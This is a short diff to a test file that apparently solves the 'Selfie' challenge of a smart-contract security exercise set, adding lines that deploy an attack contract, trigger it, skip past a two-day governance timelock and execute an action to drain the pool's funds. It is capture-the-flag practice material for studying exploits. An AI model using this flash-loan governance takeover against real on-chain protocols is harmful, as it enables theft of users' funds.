@@ -39,6 +39,13 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const AttackContractFactory = await ethers.getContractFactory("AttackGovernance");
+        const attackContract = await AttackContractFactory.deploy(pool.address, governance.address, token.address);
+        await attackContract.connect(player).attack();
+
+        // wait 2 days for timelock, then execute function to drain funds
+        await ethers.provider.send("evm_increaseTime", [86400 * 2]);
+        await governance.connect(player).executeAction(1);
     });
 
     after(async function () {
